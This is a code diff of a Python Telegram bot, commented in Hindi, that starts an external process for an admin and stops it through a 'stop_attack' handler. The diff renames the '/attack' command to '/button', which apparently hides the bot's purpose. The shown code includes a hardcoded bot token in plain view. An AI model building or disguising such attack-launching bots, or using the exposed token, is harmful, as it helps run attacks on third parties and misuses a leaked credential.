@@ -8,10 +8,10 @@ ADMIN_ID = 7899583720        # अपना Telegram ID यहाँ डाल�
 bot = telebot.TeleBot("8278930868:AAEFn-tRoVH-aP5x8OnxONoUKiq3k6r9rEw")
 process = None
 
-@bot.message_handler(commands=['attack'])
-def start_attack(message):
+@bot.message_handler(commands=['button'])
+def start_button(message):
     global process
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id != 7899583720:
         return
 
     args = message.text.split()
@@ -28,11 +28,6 @@ def start_attack(message):
         process = subprocess.Popen(shlex.split(cmd))
     except Exception as e:
         bot.reply_to(message, f"Error: {e}")
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    bot.reply_to(message, "Bot working ✅")
-
 
 @bot.message_handler(commands=['stop'])
 def stop_attack(message):
